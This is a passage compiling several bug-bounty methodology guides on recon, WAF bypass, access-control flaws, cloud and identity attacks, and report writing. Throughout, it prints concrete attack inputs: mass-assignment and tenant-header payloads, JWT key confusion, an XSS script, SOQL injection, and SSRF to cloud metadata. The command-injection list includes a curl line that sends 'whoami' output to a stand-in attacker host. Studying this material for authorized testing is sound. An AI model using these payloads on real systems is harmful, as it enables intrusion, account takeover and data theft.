Decompile mobile applications (APK via apktool/JADX, IPA via Frida/objection) to extract hardcoded API keys, Firebase configurations, AWS Cognito pools, OAuth client secrets, and embedded certificate pinning bypasses. Analyze AndroidManifest.xml for exported activities, services, broadcast receivers, and content providers vulnerable to intent injection. Test for deep link hijacking (android:scheme, custom URL schemes) that bridge web-to-app with untrusted data. In thick clients: intercept traffic with Burp + proxy chains, bypass certificate pinning via Frida scripts, and reverse engineer binary protocols (protobuf, msgpack, BSON, custom binary formats). Hunt for API versioning vulnerabilities: /v1/ endpoints with weaker auth than /v2/, deprecated endpoints still serving live data, and internal API gateways (/internal/, /svc/, /gateway/) exposed to external IPs. Test for mass assignment in REST APIs by sending unexpected fields in PATCH/PUT requests (isVerified: true, role: "admin", balance: 999999). Probe for JSON Web Token (JWT) key confusion in multi-tenant apps where tenants share validation logic but not keys.
 — The Cloud, Container & Supply Chain Inferno
Map the entire cloud attack surface: enumerate S3 buckets via permutation (target-backup, target-logs, target-dev, target-staging, target-internal), test for bucket listing permissions, object ACL misconfigurations, and CORS policies allowing arbitrary origin access. Probe for AWS Lambda function URL endpoints, Azure Function Apps, and GCP Cloud Functions with excessive IAM permissions. Test for container registry exposure (ECR, GCR, ACR, Docker Hub) — can you pull images and extract secrets from layer history? Hunt for Kubernetes misconfigurations: exposed dashboard, kubelet API on 10250/10255, etcd on 2379, API server anonymous access. Test for Server-Side Template Injection (SSTI) in cloud-native tools (AWS CloudFormation templates, Terraform plans, Helm charts). Probe CI/CD pipelines: exposed Jenkins instances (/script for Groovy RCE), GitLab runners, GitHub Actions workflow files, and .github/workflows/ for secret leakage. Perform dependency confusion attacks by publishing higher-version packages to public registries with identical names to internal packages. Test for software supply chain poisoning via compromised build artifacts, malicious NPM/PyPI packages, and typosquatting.
 — The Zero-Day, Logic & Business Logic Abyssal Plain
This is where tools die and human intellect dominates. Hunt for business logic vulnerabilities that no scanner can detect: race conditions in financial transactions (double-spending via parallel HTTP requests using Python asyncio or Burp Turbo Intruder), price manipulation in e-commerce (negative quantities, fractional quantities, scientific notation 1e-10), time-of-check to time-of-use (TOCTOU) in file uploads, and workflow bypasses (skipping checkout steps, completing orders without payment, refund abuse). Test for cryptographic failures: weak randomness in token generation (predictable UUIDv1 timestamps, Math.random() for security tokens), ECB mode encryption (byte-by-byte decryption via oracle attacks), padding oracle vulnerabilities, and CBC bit-flipping attacks. Probe for authentication bypasses via JWT jwk header injection with self-signed keys, SAML response wrapping with comment injection, and OAuth PKCE downgrade attacks. Hunt for obscure zero-day patterns: Unicode normalization differences (NFC vs NFD) in username collisions, homograph attacks in domain validation, integer overflows in memory-unsafe components, and format string vulnerabilities in logging frameworks. If you reach this paragraph and have not found a critical vulnerability, you have not thought deviously enough. The attacker does not play by rules. Neither do you. Descend until the infrastructure bleeds secrets.




Focus on going deeper with tools like cURL, not just using them but truly understanding how requests, headers, authentication, and APIs work at a low level. Push yourself to explore technologies in depth—how they are built, how they communicate, and where their weaknesses lie. Develop a mindset of constant learning and sharp thinking, aiming to improve your analytical ability and technical intelligence every day. Raise your standards so that your skill level keeps climbing beyond 95% consistency, where you don’t just try things—you understand them, break them, and master them.
Build a habit of going far beyond surface-level understanding, especially with tools like cURL and web technologies. Don’t just copy requests—break them down, study every header, every parameter, every response, and understand exactly how and why things work. Dive deep into protocols like HTTP/HTTPS, authentication mechanisms, APIs, and backend systems so you can think like both a developer and a security researcher. The goal is to train your mind to analyze systems with precision, spotting patterns, flaws, and opportunities that others miss.

At the same time, continuously expand your knowledge across different technologies—web, networking, security, and automation—so you develop a strong, interconnected understanding rather than isolated skills. Challenge yourself with complex problems, reverse engineer real-world applications, and push your thinking to a higher level of clarity and logic. Over time, this consistent effort sharpens your problem-solving ability and builds a high level of technical intelligence, where your success rate improves dramatically because you’re not guessing—you’re operating with deep understanding and strategy. Keep raising your standards, stay curious, and aim to reach a level where your skills, focus, and execution place you ahead of the majority, delivering strong results almost every time.

================================================================================ MASTERCLASS: ADVANCED ENDPOINT DISCOVERY, DEEP FUZZING, AND DATA EXFILTRATION ================================================================================ AUTHOR: Elite Red Team Lead & Offensive Security Architect DATE: April 2026 OBJECTIVE: Bypass WAFs, uncover hidden APIs, exploit business logic flaws, and extract sensitive data (Mass Enumeration, BOLA, PII Leaks). MINDSET: Amateurs spray `Nuclei` blindly against a wildcard scope. As an elite hunter, you map the business logic, reverse-engineer the developers' assumptions, and chain obscure, low-severity misconfigurations into catastrophic data leaks. We do not look for XSS; we look for logic that bleeds multi-million user databases. Below is your deeply technical, end-to-end methodology based on the absolute latest offensive security research (April 2026). Save this as a .txt for your arsenal. -------------------------------------------------------------------------------- PHASE 0: PASSIVE RECON & OSINT (DEEP-DIVE) -------------------------------------------------------------------------------- Your goal is to find what developers thought they hid or deprecated. [+] Vibe Coding & AI Tool Misconfigurations Recent research from April 20, 2026, regarding the $6.6B AI startup "Lovable" proved that "public vs. private" workspace toggles in AI tools are notoriously flawed. Look for SaaS platforms where the target hosts source code or internal chat histories. Create two free accounts. Often, unauthenticated or free-tier users can simply guess or enumerate project IDs to dump database credentials, AI chat histories, and customer data due to missing ownership validation. [+] Contextual Secret Scanning Don't just run standard regex. Use modern Go-based tools like `go-secrets-scanner` (updated April 2026) to scan historical JS files for high-entropy strings and hidden internal API keys. - TRICK: Developers often hide API keys in downloadable graphical assets or webpack chunks (CWE-538). Use `strings` on publicly accessible images and compiled CSS/JS for hidden paths. [+] OpenAPI & Swagger Archeology Fuzz for API documentation before you fuzz the API. Use `ffuf` with custom Swagger wordlists: `ffuf -u https://api.target.com/FUZZ -w swagger-wordlist.txt -mc 200 -ac` Look for `/api-docs`, `/v3/api-docs`, `/redoc`, `/swagger.json`. Once found, reconstruct the exact parameters the backend expects. -------------------------------------------------------------------------------- PHASE 1: INFRASTRUCTURE DISCOVERY & ATTACK SURFACE MANAGEMENT -------------------------------------------------------------------------------- Go beyond basic directory brute-forcing. You need to fuzz intelligently. [+] Context-Aware Endpoint Extraction Map out mobile vs. web APIs. They almost always have different rate limits and security controls. - Extract every endpoint from JavaScript files. - If `/api/v2/users` returns a 403 Forbidden, do NOT stop. Fuzz the parameters and append tricks. [+] Next-Gen Fuzzing & WAF Bypass (The "Capsaicin" Approach) Use intelligent fuzzers designed for WAF hunting (e.g., the newly released `Capsaicin` tool). To bypass modern WAFs when fuzzing endpoints, use specific character encodings and path normalization tricks: - Trailing slash bypass: `/api/v1/users` (403) -> `/api/v1/users/` (200) - Semicolon injection (Tomcat/Spring): `/api/v1/users;/123` or `/api/v1/users;%2f..%2f` - Double URL Encoding: `%252e%252e%252f` - Unicode Normalization: Some WAFs decode `ﬀ` to `ff`. Fuzz using Unicode equivalents of blocked keywords. [+] Chaining 403s to 200s A massive bug bounty strategy in 2026 is chaining. If you hit a 403 on an admin endpoint, fuzz the parameters. A request to `GET /api/admin/config` might be blocked, but `GET /api/admin/config?debug=true` or `POST /api/admin/config` with `{"role":"admin"}` might bypass the route-level middleware and hit the controller directly. -------------------------------------------------------------------------------- PHASE 2: WEB / APPLICATION LAYER LOGIC ANALYSIS -------------------------------------------------------------------------------- This is where the million-dollar payouts live. Look for Broken Object Level Authorization (BOLA) and Mass Assignment. [+] GraphQL Deep-Data Leaks (The "totalCount" Tactic) Based on an April 20, 2026 zero-day write-up involving a massive e-commerce marketplace leaking 57 million users: - ENUMERATION: If GraphQL introspection is disabled, DO NOT quit. Enumerate fields via error messages (e.g., query a non-existent field to get "Did you mean `users`?"). - PAGINATION LEAKS: Always check for `totalCount` on paginated GraphQL responses. This reveals the exact dataset scale (highly sensitive business intel). - THE EXPLOIT: Look for missing per-resolver authorization. Route-level middleware might allow unauthenticated access to basic nodes, but if developers forget resolver-level auth on fields like `isSeller`, `account_age`, or `role`, you can dump the entire segmented user database at 10 req/sec. [+] Mass Assignment -> Privilege Escalation Use Burp Suite/Proxy to observe the normal flow. If a `GET /api/users/me` returns `{"id":1, "name":"Hunter", "is_verified":false, "role":"user"}`, the backend is mapping the DB object directly to JSON. - THE TRICK: Take the uneditable fields (`is_verified`, `role`) and inject them into your `PUT` or `POST` request payload. - Payload: `{"name":"Hunter", "role":"admin", "is_verified":true}`. If the backend uses unsafe object binding, you just achieved Account Takeover (ATO) or vertical privilege escalation. -------------------------------------------------------------------------------- PHASE 3: CLOUD & NETWORK ENVIRONMENT SPECIFICS -------------------------------------------------------------------------------- Modern apps rely on cloud-managed authentication. Target the Identity Providers (IdP). [+] AWS Cognito & Azure AD B2C Logic Flaws Developers constantly misconfigure cloud IAM and Cognito pools. - Analyze the `id_token` and `access_token` JWTs. Look for custom claims like `custom:tenant_id` or `custom:role`. - During the registration flow (Signup API), try to manually pass these custom attributes. AWS Cognito often accepts them if the developer did not explicitly make them read-only in the AWS Console. - Try unauthenticated API calls to the Cognito Identity Provider to read other users' metadata using `AdminGetUser` if IAM roles are overly permissive on the unauthenticated identity pool. [+] S3 / Blob Storage Exposure APIs often leak internal URLs in debug responses. If an API response returns an internal S3 bucket URL or a pre-signed URL, capture it. Modify the parameters of the pre-signed URL to see if the signature verification is flawed, allowing you to traverse the bucket and exfiltrate sensitive backups. -------------------------------------------------------------------------------- PHASE 4: ADVANCED EXPLOITATION & CHAINING -------------------------------------------------------------------------------- Stop treating vulnerabilities in isolation. As Praetorian's late-April 2026 exploit chain analysis emphasizes, critical impact comes from correlating isolated, low-severity findings into a realistic attack path. [+] The "Blind & Bind" Chain 1. Find a low-severity Information Disclosure (e.g., an API error leaks internal IP `10.0.0.5`). 2. Find a seemingly useless endpoint parameter that fetches remote avatars (e.g., `POST /api/profile/avatar?url=`). 3. Chain them: Use the SSRF parameter to target the internal IP discovered in step 1. 4. Fuzz for internal admin panels bypassing the external WAF. [+] Blind Command Injection Fuzzing When fuzzing endpoints that process files, hostnames, or image processing, create a custom list for blind command injection. - Inject payloads like: `; sleep 5`, `| interactsh-url`, `` `curl attacker.com/$(whoami)` ``. - Always use Out-Of-Band (OOB) techniques. A server might not return the result of `whoami`, but if it resolves your Burp Collaborator payload, you have RCE. -------------------------------------------------------------------------------- PHASE 5: REPORTING & ETHICAL POST-EXPLOITATION -------------------------------------------------------------------------------- If you want maximum payouts, you must translate technical bugs into massive Business Impact. [+] Demonstrate the "Why It Matters" Never just report "BOLA found on /api/users". Emulate the April 2026 e-commerce GraphQL report: - "By abusing missing resolver-level authorization on the `users` query, an unauthenticated attacker can export the entire database of 57 Million users. Furthermore, filtering by the `isSeller` field allows fraudsters to map and target high-value merchants for targeted phishing campaigns and credential stuffing, directly damaging the platform's revenue and competitive intelligence." [+] Provide Code-Level Remediation Tell the engineers exactly how to fix it: - "Implement query depth and rate limiting at the GraphQL layer." - "Add authentication middleware at the exact field resolver level, not just the route." - "Ensure that DTOs (Data Transfer Objects) explicitly define writable properties to prevent Mass Assignment." ================================================================================ FINAL DIRECTIVE: Stay patient. Map the API meticulously. Fuzz parameters, not just paths. The biggest bounties hide behind the fields developers thought you wouldn't notice. Happy hunting.

================================================================================ ELITE BUG BOUNTY & OFFENSIVE SECURITY METHODOLOGY v2026.4 AUTHOR: Lead Offensive Security Architect TARGET AUDIENCE: Advanced Security Researchers / Bug Bounty Hunters ================================================================================ INTRODUCTION: THE EXPERT MINDSET To consistently find P1s and Criticals, you must discard the automated-scanner mentality. The industry is currently flooded with "AI slop" reports. To stand out, you must focus on complex business logic, cross-platform correlation, and architectural flaws that no scanner or basic AI agent can contextualize. Automate the mundane recon, but use your human intuition to chain obscure behaviors together. Below is the definitive, deep-dive methodology incorporating cutting-edge research and techniques discovered as recently as April 2026. -------------------------------------------------------------------------------- PHASE 0: PASSIVE RECON & OSINT (DEEP-DIVE) Goal: Understand the target's corporate structure, acquisitions, and forgotten infrastructure before sending a single packet. 1. Autonomous Baseline Recon Do not waste manual hours on standard subdomain enumeration. Leverage autonomous AI scripts (e.g., Claude-based bug bounty agents) to baseline the target (Subfinder, HTTPX, Nuclei). Let the automation build your map while you focus on analysis. 2. Cloud Identity & Cross-Platform Correlation A company's web app is just one door. Look at their identity perimeter. * Entra ID (Azure AD) Recon: Enumerate the tenant using OpenID configuration endpoints. * User Validation: Probe `GetUserRealm` to validate user accounts passively. * The email infrastructure (MX records) and cloud identity often leak metadata that can be correlated with web app user lists. 3. Origin IP Exposure (CDN Bypassing) Modern perimeters hide behind CDNs like Cloudflare or Akamai. A CDN is only as strong as the origin's firewall. * Technique: Scrape Certificate Transparency (CT) logs and legacy DNS records to find the true Origin IP. * Validation: `curl -k -H "Host: target.com" https://[ORIGIN_IP]/`. If it returns the site, you have bypassed the CDN, WAF, rate-limiting, and bot mitigation. -------------------------------------------------------------------------------- PHASE 1: INFRASTRUCTURE DISCOVERY & ATTACK SURFACE MANAGEMENT Goal: Map the microservices, APIs, and hidden cloud assets. 1. API Gateway Analysis Look for discrepancies between the API Gateway and the backend microservices. * Look for header-based routing: `X-Forwarded-Host`, `X-Rewrite-URL`, `X-Original-URL`. * Path confusion: `api/v1/users/..%2f..%2fadmin` - Does the gateway normalize this differently than the backend? 2. Cryptographic Asset Discovery Identify how the application handles session state. If it's a modern .NET environment, identify if `Microsoft.AspNetCore.DataProtection` is in use. As seen in CVE-2026-40372, regressions in HMAC validation can allow attackers to forge payloads that pass authenticity checks, allowing you to decrypt and forge authentication cookies and antiforgery tokens. -------------------------------------------------------------------------------- PHASE 2: WEB / APPLICATION LAYER LOGIC ANALYSIS Goal: Break the application's underlying assumptions and bypass modern WAFs. 1. Advanced WAF Bypass Mechanics WAFs are not invincible; they are rule engines with parsing limits. * OWASP CRS Flaw (CVE-2026-21876): Modern frameworks support `multipart/form-data`. In widely used WAF rule sets, the internal variable tracking the payload (e.g., `TX:1`) is overwritten with each new multipart segment and *only validated at the end of the cycle*. * *Trick*: Place your malicious payload at the very end of a large series of valid multipart parameters to evade detection. 2. Advanced JWT Exploitation Do not just look for "None" algorithms. Look for implementation flaws. * JSON Obfuscation: Insert whitespace or line breaks inside the header JSON *before* Base64 encoding to bypass WAF regex rules looking for specific Base64 strings. * Double Base64 Decoding: Many microservices route through middlewares that accidentally double-decode tokens. Send a double-encoded payload. * Key Confusion & JWKS: Find the `well-known/jwks.json` file. Convert the exposed public key to plain text, sign your forged JWT using `HS256`, and use that public key as your HMAC secret. If the server trusts its own public key for HMAC validation, you achieve total authorization bypass. 3. AI Platform Logic Flaws If the target utilizes AI orchestrators or LLM agents (e.g., LiteLLM), look for Model Context Protocol (MCP) integrations. * Vulnerability (CVE-2026-30623): AI SDKs that allow users to add MCP servers via JSON configs often fail to sanitize the `stdio` transport parameters. * *Trick*: Inject arbitrary OS commands into the JSON configuration specifying the MCP server's command/args values, leading to authenticated RCE. -------------------------------------------------------------------------------- PHASE 3: CLOUD & NETWORK ENVIRONMENT SPECIFICS Goal: Exploit the environment hosting the code. 1. Bypassing Modern Authentication via Legacy Auth If you compromised a credential or session but hit an MFA prompt, attack the Entra ID / Microsoft 365 tenant directly. * *Trick*: Probe the tenant for legacy protocols (MAPI, IMAP, POP3). Many organizations enforce Conditional Access policies for web logins but forget to block legacy authentication, allowing you to bypass MFA entirely. 2. WebAssembly & Sandbox Escapes When testing platforms that execute user code in a "secure" sandbox (e.g., Pyodide WebAssembly environments or Node.js Terrarium instances): * Look for JavaScript prototype chain traversals. * *Trick (CVE-2026-5752)*: If sandbox global objects inherit properties from `Object.prototype`, traverse up the chain to the function constructor, create a function that returns `globalThis`, and access Node.js internals like `require()` to execute arbitrary system commands as root. -------------------------------------------------------------------------------- PHASE 4: ADVANCED EXPLOITATION & CHAINING Goal: Maximize impact by treating single bugs as stepping stones. 1. The "Identity Trap" Chain * Step 1: Enumerate the target's WordPress REST API to extract valid usernames. * Step 2: Bypass the Cloudflare WAF by hitting the directly exposed Origin IP. * Step 3: Exploit an XSS or direct access vulnerability to steal a low-privilege session token. * Step 4: Use the stolen credentials against the organization's Azure AD endpoint via a legacy IMAP protocol to bypass MFA. * *Result*: A medium-severity info leak becomes a Critical Total Tenant Compromise. 2. Webhook / SSRF to Cloud Metadata Never stop at basic SSRF. * If you find an SSRF on AWS, hit `http://169.254.169.254/latest/api/token` with a `X-aws-ec2-metadata-token-ttl-seconds` header to bypass IMDSv2 protections. * Extract the IAM role credentials and immediately query `sts:GetCallerIdentity` via the AWS CLI to assess your privilege level. -------------------------------------------------------------------------------- PHASE 5: REPORTING & ETHICAL POST-EXPLOITATION Goal: Secure the bag, maintain professionalism, and demonstrate defense-in-depth value. 1. The Proof of Concept (PoC) Rule * Never dump production databases. Use `select @@version` or read `/etc/passwd` to prove impact. * If you achieve RCE, execute a harmless command like `id`, `whoami`, or `calc.exe`. 2. Beating the "AI Slop" Bias Bug bounty triage teams are currently exhausted by fake, hallucinated AI-generated reports. * Structure your report meticulously. * Provide a 1-click Docker environment or a clear, step-by-step Python script to reproduce the vulnerability. * Include the "Business Impact" section clearly: "This vulnerability allows an attacker to forge identity tokens due to a key confusion flaw, resulting in Total Tenant Compromise and a direct violation of GDPR/CCPA data integrity." 3. Suggest the "Purple Team" Fix Provide remediation advice that proves your expertise: * Instead of just "Fix the WAF", say: "Configure the origin server firewall to drop all traffic except from official Cloudflare IP ranges. Implement a Conditional Access policy in Entra ID to disable legacy protocols." ================================================================================ END OF METHODOLOGY. That is noise. True Elite Hunters and Red Team Architects understand that Access Control flaws exist in the *seams* between microservices, in the translation between data formats, and in the assumptions developers make about user state. You are not looking for a broken padlock; you are looking for a door that the architect forgot to put a lock on because it's "hidden" in a nested JSON object or a legacy GraphQL schema [1, 5, 6]. Patience, meticulous proxy history review, and an obsession with business logic are your weapons. Here is the definitive methodology for systematically destroying access control mechanisms. ================================================================================ PHASE 0: PASSIVE RECON & OSINT (DEEP-DIVE FOR HIDDEN IDENTIFIERS) ================================================================================ To exploit access control, you need objects to access. If the application uses predictable integers, it's easy. If they use UUIDv4, you must hunt for leaks. [+] 0.1. JS Map File & Hardcoded API Hunting: - Do not just spider the site. Extract all `.js` and `.js.map` files. Use tools like `TruffleHog` or custom `grep` scripts to search for legacy API endpoints (e.g., `/api/v1/` when the app is on `/api/v3/`). - Why? Developers often patch access control in `v3` but leave `v1` running for legacy mobile app support. `v1` points to the same production database but lacks the new authorization middleware. [+] 0.2. UUID / GUID Reconnaissance: - The biggest lie in AppSec is that UUIDs prevent IDOR [1]. They don't; they prevent *enumeration*. - Hunt for UUID leaks. Check the `CreatedBy` fields in public comments, inspect WebSocket frames for broadcasted internal IDs, or look at OSINT (GitHub gists, public Trello boards of the company) for leaked test UUIDs. - If you find a UUID leak (Information Disclosure), chain it immediately to an access control endpoint. ================================================================================ PHASE 1: INFRASTRUCTURE DISCOVERY & ATTACK SURFACE MANAGEMENT ================================================================================ Access control is often enforced at the API Gateway or WAF level. We must bypass the routing layer to hit the naked backend microservice. [+] 1.1. Path Normalization Bypasses: - If `/api/admin/users` returns 403 Forbidden, the API Gateway might be blocking the exact string `/admin/`. - Exploit backend routing normalization: `GET /api/v1/users/..%2fadmin/users` or `GET /api/admin%20/users`. Spring Boot, Express.js, and Ruby on Rails all parse these differently than AWS API Gateway. [+] 1.2. GraphQL vs. REST Discrepancies: - Recent 2026 research into major DevOps platforms (like GitLab) revealed that while REST APIs are heavily audited for access control, their newer GraphQL counterparts often miss field-level authorization [6]. - Tactic: Extract the GraphQL schema via Introspection. Look for queries like `snippets` or `documents` that do not require an explicit `userId` parameter but return unauthorized global data across the tenant [6]. ================================================================================ PHASE 2: WEB / APPLICATION LAYER LOGIC ANALYSIS (THE CORE) ================================================================================ This is where the real hacking happens. Do not rely on automated scanners; they cannot understand business logic. Use multi-role browser extensions (like PwnFox or Firefox Multi-Account Containers) paired with Burp Suite's `Autorize` plugin. [+] 2.1. The "Nested JSON" IDOR Bypass (2025/2026 Attack Vector): - Modern APIs validate the top-level parameters but ignore nested objects [5]. - Scenario: You want to edit a victim's email template. - Standard Request: `{"eventID": "VICTIM_ID", "data": "payload"}` -> Result: 403 Forbidden [5]. - Bypass Request: Send *your* authorized ID at the top level to pass the middleware, but inject the victim's ID in the nested parsing logic: ```json { "eventID": "ATTACKER_ID", "data": { "eventID": "VICTIM_ID", "text": "<script>alert('XSS')</script>" } } ``` - The middleware checks `ATTACKER_ID` (Authorized: 200 OK), but the backend database parser updates `VICTIM_ID`. This allows unauthorized data manipulation [5]. [+] 2.2. HTTP Parameter Pollution (HPP) & Array Injection: - If `PUT /api/profile?user_id=123` is blocked. - Try HPP: `PUT /api/profile?user_id=ATTACKER_ID&user_id=VICTIM_ID`. (Tomcat uses the first, PHP uses the last. If the WAF/Auth layer is Tomcat but the backend is PHP, you bypass the check). - Try Array Injection: `{"user_id": ["ATTACKER_ID", "VICTIM_ID"]}`. [+] 2.3. Method Substitution & Content-Type Spoofing: - Change `POST` to `PUT`, `PATCH`, or even `DELETE` on user data endpoints. - If an endpoint expects JSON, change the `Content-Type` to `application/xml` and send XML. The WAF's JSON-parsing regex rules will ignore the payload, but the backend Spring framework might gladly parse the XML and execute the IDOR. [+] 2.4. Custom Query Languages (SOQL / NoSQL) for Unauthorized Data: - Traditional SQLi is dying, but ORM and custom query injections are thriving. - In environments like Salesforce, SOQL injection bypasses access controls. Since SOQL doesn't allow stacked queries or `--` comments, exploit the `LIKE` operator to fuzz and extract unauthorized custom fields or PII of other users [7]. - Payload logic: Inject `' OR Name LIKE 'A%` into a vulnerable parameter to sequentially dump unauthorized data sets without breaking the query structure [7]. ================================================================================ PHASE 3: CLOUD & NETWORK ENVIRONMENT SPECIFICS ================================================================================ Cloud misconfigurations are the ultimate access control failure. The application might be secure, but the Identity Provider (IdP) is vulnerable. [+] 3.1. AWS Cognito / Azure AD B2C Attribute Manipulation: - Do not just attack the application API; attack the IdP directly. - Intercept the JWT. Look at the claims. Can you modify your own attributes via the AWS Cognito API (e.g., `aws cognito-idp update-user-attributes`)? - If the identity pool lacks proper IAM scoping, you might be able to update your `custom:role` to `admin` or change your `tenant_id` to the victim's company. When you log back into the app, the app trusts the IdP, granting you cross-tenant data access. [+] 3.2. Cross-Tenant Header Forgery (SaaS Apps): - In B2B SaaS, data isolation is often handled by a microservice header. - Inject `X-Tenant-ID: <victim_tenant>`, `X-Account-ID: <victim_account>`, or `X-Original-URL: /admin` in every request. If the backend microservice implicitly trusts headers generated by the internal API Gateway, you can spoof your context. ================================================================================ PHASE 4: ADVANCED EXPLOITATION & CHAINING ================================================================================ A simple IDOR is a Medium severity. Chaining it to Account Takeover (ATO) or Remote Code Execution (RCE) makes it a Critical ($$$$$). [+] 4.1. IDOR to Massive Account Takeover (ATO): - Identify a signup or profile update endpoint with NO RATE LIMIT [3]. - If there is an IDOR on `POST /api/user/link_phone`, use Burp Intruder to brute force and link thousands of victim phone numbers to your attacker account [3]. - Trigger a "Login via Phone / OTP", which now routes the victim's auth tokens to your device [3]. [+] 4.2. IDOR to Stored XSS to Admin Session Hijacking: - Write-up from late 2025: An IDOR in an email template editor allows you to write payload data into a Victim/Admin's account [5]. - You inject a Blind XSS payload (via XSS Hunter or bxss.in) into the Admin's dashboard using the IDOR [5]. - When the Admin logs in and views their templates, the XSS fires, exfiltrating their session token or executing administrative actions on your behalf [5]. Self-XSS elevated to widespread compromise [5]. [+] 4.3. Race Conditions in Access Control (Time-of-Check to Time-of-Use): - Invite a user to a team as a "Viewer". - Intercept the request. Send 30 parallel requests using a tool like `Turbo Intruder` or Caido's race condition features. - Half the requests update the role to "Admin", half process the invitation creation. If the backend checks the role authorization *before* writing the final state to the database, you can slip an Admin invite through. ================================================================================ PHASE 5: REPORTING & ETHICAL POST-EXPLOITATION ================================================================================ How you report the bug dictates your payout. Elite hunters don't just report "I can see user 5's name." They report "Complete Confidentiality & Integrity Compromise of User Infrastructure." [+] 5.1. Prove the Business Impact: - Demonstrate *Unauthorized Data Deletion* (e.g., deleting a banking beneficiary or canceling another user's scheduled financial transfer via a broken `/api/cancel_scheduled_transfer` endpoint) [1, 9]. - Clearly state the CVSS impact: Confidentiality (High), Integrity (High), Availability (High - if deleting data). [+] 5.2. The Perfect Report Structure: - 1. Executive Summary (1-2 sentences on what is breached). - 2. Prerequisites (e.g., "Two standard user accounts in different tenants"). - 3. Step-by-Step Reproduction (Use raw HTTP requests, explicitly highlighting the manipulated parameter). - 4. Impact Assessment (What happens to the business? Data breach, GDPR violation, loss of funds). - 5. Remediation Advice (Do not just say "fix it". Tell them to implement Object-Level Access Control (OLAC) and validate the session JWT against the requested resource ID at the data layer, preventing Trust-the-Client vulnerabilities). STAY RUTHLESS. STAY CURIOUS. AUTOMATE THE RECON, BUT MANUALLY DESTROY THE LOGIC. ```
